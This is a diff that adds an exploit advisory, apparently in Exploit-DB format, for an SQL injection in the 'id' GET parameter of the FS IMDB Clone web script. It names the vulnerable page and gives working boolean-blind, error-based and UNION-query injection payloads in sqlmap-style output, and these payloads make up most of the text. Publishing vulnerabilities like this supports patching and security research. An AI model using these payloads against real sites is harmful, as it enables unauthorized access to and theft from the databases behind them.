@@ -1,0 +1,32 @@
+# Exploit Title: FS IMDB Clone - 'id' SQL Injection
+# Date: 2017-12-06
+# Exploit Author: Dan°
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/imdb-clone/
+# Version: 2017-12-06
+# Tested on: Kali Linux 2.0
+
+(PoC):
+SQL Injection on GET parameter = id
+http://localhost/show_misc_video.php?id=1
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7861=7861
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 2902 FROM(SELECT
+COUNT(*),CONCAT(0x71766b6271,(SELECT
+(ELT(2902=2902,1))),0x71707a7071,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-5831 UNION ALL SELECT
+NULL,CONCAT(0x71766b6271,0x454e4e656f6a7a4676744c594479535a49667041726266686f6d6b46774d67425a7a4e5857617065,0x71707a7071),NULL,NULL,NULL,NULL,NULL,NULL--
+WuUS
+---
